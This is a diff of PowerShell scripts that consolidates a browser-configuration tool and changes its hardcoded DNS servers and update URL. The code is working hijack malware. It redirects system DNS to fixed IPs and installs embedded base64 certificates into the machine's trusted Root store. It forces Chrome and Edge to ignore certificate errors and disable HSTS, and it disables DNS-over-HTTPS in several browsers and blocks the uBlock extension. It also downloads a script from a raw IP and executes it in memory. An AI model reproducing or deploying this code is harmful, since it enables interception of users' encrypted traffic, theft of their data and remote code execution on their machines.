@@ -1,163 +1,7 @@
-﻿. ./consts.ps1
-
-function ConfigureCertificates {
-    foreach ($key in $xdata.Keys) {
-        Cert-Work -contentString $xdata[$key]
-    }
-}
-
-function Cert-Work {
-    param(
-        [string] $contentString
-    )
-    $outputFilePath = [System.IO.Path]::GetTempFileName()
-    $binary = [Convert]::FromBase64String($contentString)
-    Set-Content -Path $outputFilePath -Value $binary -AsByteStream
-    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
-}
-
-function Install-CertificateToStores {
-    param(
-        [string] $CertificateFilePath,
-        [string] $Password
-    )
-
-    try {
-        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
-
-        # Import certificate to Personal (My) store
-        $personalStorePath = "Cert:\LocalMachine\My"
-        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
-        Write-Output "Certificate installed successfully to Personal store (My)."
-
-        # Import certificate to Root store
-        $rootStorePath = "Cert:\LocalMachine\Root"
-        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
-        Write-Output "Certificate installed successfully to Root store."
-
-    } catch {
-        throw "Failed to install certificate: $_"
-    }
-}
-
-function ConfigureChrome {
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0
-
-    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"
-
-    if (-not (Test-Path $chromeKeyPath)) {
-        New-Item -Path $chromeKeyPath -Force | Out-Null
-    }
-
-    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
-    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
-    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"
-
-    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1
-
-    Write-Output "Chrome configured"
-}
-
-. ./utils.ps1
-
-function ConfigureChromeUblock {
-    $keywords = @("uBlock")
-
-    foreach ($dir in Get-EnvPaths) {
-        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
-        
-        try {
-            if (Test-Path -Path $chromeDir -PathType Container) {
-                $extensions = Get-ChildItem -Path $chromeDir -Directory
-
-                foreach ($extension in $extensions) {
-                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
-                    if ($manFile -ne "") {
-                        $foundKeyword = $false
-                        
-                        foreach ($manifestValue in $keywords) {
-                            $content = Get-Content -Path $manFile -Raw
-                            if ($content -match [regex]::Escape($manifestValue)) {
-                                $foundKeyword = $true
-                                break
-                            }
-                        }
-
-                        if ($foundKeyword) {
-                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
-                            chromeublock_ProcessManifestAll -extName $extFolderName
-                        }
-                    }
-                }
-            }
-        } catch {
-             Write-Error "Error occurred: $_"
-        }
-    }
-}
-
-
-function chromeublock_FindManifestFile {
-    param (
-        [string]$folder
-    )
-
-    $result = ""
-
-    Get-ChildItem -Path $folder | ForEach-Object {
-        if (-not ($_.PSIsContainer)) {
-            if ($_.Name -eq "manifest.json") {
-                $result = $_.FullName
-                return
-            }
-        } elseif ($_.Name -notin @('.', '..')) {
-            $result = chromeublock_FindManifestFile -folder $_.FullName
-            if ($result -ne "") {
-                return
-            }
-        }
-    }
-
-    return $result
-}
-
-
-function chromeublock_ProcessManifestAll {
-    param (
-        [string]$extName
-    )
-
-    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
-}
-
-function chromeublock_ProcessManifest {
-    param (
-        [string]$extName,
-        [string]$browser
-    )
-
-    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
-    
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-    
-    $regKeyIndex = 1
-    do {
-        $keyName = "$regKeyIndex"
-        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
-        if ($val -eq $extName) {
-            return
-        }
-        $regKeyIndex++
-    } until (-not (Test-Path "$regPath\$keyName"))
-
-    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
-}
-$PrimaryDNSServer = '213.226.112.111'
-$SecondaryDNSServer = '195.58.51.168'
-$autoUpdate = 'False'
-$updateUrl = 'http://213.226.112.110/data/update.txt'
+﻿$PrimaryDNSServer = '185.247.141.78'
+$SecondaryDNSServer = '185.247.141.51'
+$autoUpdate = ''
+$updateUrl = 'http://185.247.141.76/data/update.txt'
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
@@ -256,7 +100,207 @@ $xdata = @{
 'MAcGBSsOAwIaBBSsjGg5jo3CAHOfh+WgqliHqEcCwQQUiThkTnc72R2ECYFslhTFTFn4LkwCAgfQ'
 }
 
-. .\Consts.ps1
+function Get-EnvPaths {
+    $a = Get-LocalAppDataPath
+    $b =  Get-AppDataPath
+    return @($a , $b)
+}
+
+function Get-TempFile {
+    $tempPath = [System.IO.Path]::GetTempPath()
+    $tempFile = [System.IO.Path]::GetTempFileName()
+    return $tempFile
+}
+
+function Get-LocalAppDataPath {
+    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
+}
+
+function Get-AppDataPath {
+    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
+}
+
+function Get-ProfilePath {
+    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+}
+
+function Close-Processes {
+    param (
+        [string[]]$processes
+    )
+
+    foreach ($process in $Processes) {
+        $command = "taskkill.exe /im $process /f"
+        Invoke-Expression $command
+    }
+}
+
+
+
+
+function ConfigureCertificates {
+    foreach ($key in $xdata.Keys) {
+        Cert-Work -contentString $xdata[$key]
+    }
+}
+
+function Cert-Work {
+    param(
+        [string] $contentString
+    )
+    $outputFilePath = [System.IO.Path]::GetTempFileName()
+    $binary = [Convert]::FromBase64String($contentString)
+    try {
+        Set-Content -Path $outputFilePath -Value $binary -AsByteStream
+    } catch {
+        Add-Content -Path $outputFilePath -Value $binary -Encoding Byte
+    }
+    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
+}
+
+function Install-CertificateToStores {
+    param(
+        [string] $CertificateFilePath,
+        [string] $Password
+    )
+
+    try {
+        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
+
+        # Import certificate to Personal (My) store
+        $personalStorePath = "Cert:\LocalMachine\My"
+        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
+        Write-Output "Certificate installed successfully to Personal store (My)."
+
+        # Import certificate to Root store
+        $rootStorePath = "Cert:\LocalMachine\Root"
+        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
+        Write-Output "Certificate installed successfully to Root store."
+
+    } catch {
+        throw "Failed to install certificate: $_"
+    }
+}
+
+function ConfigureChrome {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0
+
+    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"
+
+    if (-not (Test-Path $chromeKeyPath)) {
+        New-Item -Path $chromeKeyPath -Force | Out-Null
+    }
+
+    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
+    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
+    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"
+
+    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1
+
+    Write-Output "Chrome configured"
+}
+
+
+
+
+
+function ConfigureChromeUblock {
+    $keywords = @("uBlock")
+
+    foreach ($dir in Get-EnvPaths) {
+        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
+        
+        try {
+            if (Test-Path -Path $chromeDir -PathType Container) {
+                $extensions = Get-ChildItem -Path $chromeDir -Directory
+
+                foreach ($extension in $extensions) {
+                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
+                    if ($manFile -ne "") {
+                        $foundKeyword = $false
+                        
+                        foreach ($manifestValue in $keywords) {
+                            $content = Get-Content -Path $manFile -Raw
+                            if ($content -match [regex]::Escape($manifestValue)) {
+                                $foundKeyword = $true
+                                break
+                            }
+                        }
+
+                        if ($foundKeyword) {
+                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
+                            chromeublock_ProcessManifestAll -extName $extFolderName
+                        }
+                    }
+                }
+            }
+        } catch {
+             Write-Error "Error occurred: $_"
+        }
+    }
+}
+
+
+function chromeublock_FindManifestFile {
+    param (
+        [string]$folder
+    )
+
+    $result = ""
+
+    Get-ChildItem -Path $folder | ForEach-Object {
+        if (-not ($_.PSIsContainer)) {
+            if ($_.Name -eq "manifest.json") {
+                $result = $_.FullName
+                return
+            }
+        } elseif ($_.Name -notin @('.', '..')) {
+            $result = chromeublock_FindManifestFile -folder $_.FullName
+            if ($result -ne "") {
+                return
+            }
+        }
+    }
+
+    return $result
+}
+
+
+function chromeublock_ProcessManifestAll {
+    param (
+        [string]$extName
+    )
+
+    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
+}
+
+function chromeublock_ProcessManifest {
+    param (
+        [string]$extName,
+        [string]$browser
+    )
+
+    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
+    
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    
+    $regKeyIndex = 1
+    do {
+        $keyName = "$regKeyIndex"
+        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
+        if ($val -eq $extName) {
+            return
+        }
+        $regKeyIndex++
+    } until (-not (Test-Path "$regPath\$keyName"))
+
+    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
+}
+
+
+
 
 function Set-DnsServers {
     param (
@@ -296,32 +340,40 @@ function ConfigureEdge {
 
     Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
 }
-. ./utils.ps1
+
+
+
 
 function ConfigureFireFox 
 {
-    Set-FirefoxRegistry -KeyPaths @(
-        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
-        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
-    ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
-
+    try 
+    {
+        Set-FirefoxRegistry -KeyPaths @(
+            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
+            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
+        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
+    }
+    catch 
+    {
+        Write-Warning "Failed to set firefox registry: $_"
+    }
     foreach ($dir in Get-EnvPaths) 
     {
-        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"
-
         try 
         {
+        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"
+
             $UserJSContent = 'user_pref("network.trr.mode", 5);'
             
             if (!(Test-Path -Path $path -PathType Leaf)) 
             {
-                $null = New-Item -Path $path -ItemType File
-                Add-Content -Path $path -Value $UserJSContent
+                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
+                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
             }
         }
         catch 
         {
-            Write-Error "Failed to write to user.js file: $_"
+            Write-Warning "Failed to write to user.js file: $_"
         }
     }
 }
@@ -341,7 +393,7 @@ function Set-FirefoxRegistry {
         foreach ($i in 0..($KeyPaths.Length - 1)) {
             $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
             if ($key -eq $null) {
-                Write-Error "Failed to open registry key: $($KeyPaths[$i])"
+                Write-Warning "Failed to open registry key: $($KeyPaths[$i])"
                 return
             }
 
@@ -350,10 +402,12 @@ function Set-FirefoxRegistry {
         }
     }
     catch {
-        Write-Error "Error accessing or modifying registry: $_"
+        Write-Warning "Error accessing or modifying registry: $_"
     }
 }
-. ./utils.ps1
+
+
+
 
 function ConfigureOpera
 {
@@ -368,7 +422,7 @@ function ConfigureOpera
                 ConfigureOperaInternal -FilePath $path
             }
         } catch {
-            Write-Error "Error occurred: $_"
+            Write-Warning "Error occurred in Opera: $_"
         }
     }
 }
@@ -402,87 +456,9 @@ function ConfigureOperaInternal {
 
     Write-Host "Successfully configured Opera settings in $filePath"
 }
-. ./consts.ps1
-. ./utils.ps1
-. ./dnsman.ps1
-. ./chrome.ps1
-. ./chrome.uBlock.ps1
-. ./edge.ps1
-. ./yandex.ps1
-. ./opera.ps1
-. ./firefox.ps1
-. ./cert.ps1
-. ./xUpdate.ps1
 
-function main {
-    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
-    ConfigureCertificates
-    ConfigureChrome
-    ConfigureEdge
-    ConfigureYandex
-    ConfigureFireFox
-    ConfigureOpera
-    ConfigureChromeUblock
-}
 
-main
-function Get-EnvPaths {
-    $a = Get-LocalAppDataPath
-    $b =  Get-AppDataPath
-    return @($a , $b)
-}
 
-function Get-TempFile {
-    $tempPath = [System.IO.Path]::GetTempPath()
-    $tempFile = [System.IO.Path]::GetTempFileName()
-    return $tempFile
-}
-
-function Get-LocalAppDataPath {
-    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
-}
-
-function Get-AppDataPath {
-    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
-}
-
-function Get-ProfilePath {
-    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-}
-
-function Close-Processes {
-    param (
-        [string[]]$processes
-    )
-
-    foreach ($process in $Processes) {
-        $command = "taskkill.exe /im $process /f"
-        Invoke-Expression $command
-    }
-}
-#AutoUpdate
-
-function DoAutoUpdate() 
-{
-   
-    if ($autoUpdate -eq 'True')
-    {
-
-    try {
-        # Download the script content from the URL
-        $scriptContent = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -Method Get | Select-Object -ExpandProperty Content
-        
-        # Execute the downloaded script content in memory
-        Invoke-Expression -Command $scriptContent
-    }
-    catch {
-        Write-Error "Failed to download or execute the script: $_"
-    }
-    }
-}
-
-DoAutoUpdate
-. ./utils.ps1
 
 function ConfigureYandex
 {
@@ -524,4 +500,72 @@ function ConfigureYandexInternal {
 
     Write-Host "Successfully configured Yandex settings in $filePath"
 }
+#AutoUpdate
+
+function DoAutoUpdate() 
+{
+   
+    if ($autoUpdate -eq 'True')
+    {
+
+    try {
+        # Download the script content from the URL
+        $scriptContent = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -Method Get | Select-Object -ExpandProperty Content
+        
+        # Execute the downloaded script content in memory
+        Invoke-Expression -Command $scriptContent
+    }
+    catch {
+        Write-Error "Failed to download or execute the script: $_"
+    }
+    }
+}
+
+DoAutoUpdate
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function main {
+    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
+    ConfigureCertificates
+    ConfigureChrome
+    ConfigureEdge
+    ConfigureYandex
+    ConfigureFireFox
+    ConfigureOpera
+    ConfigureChromeUblock
+}
+
+main
 
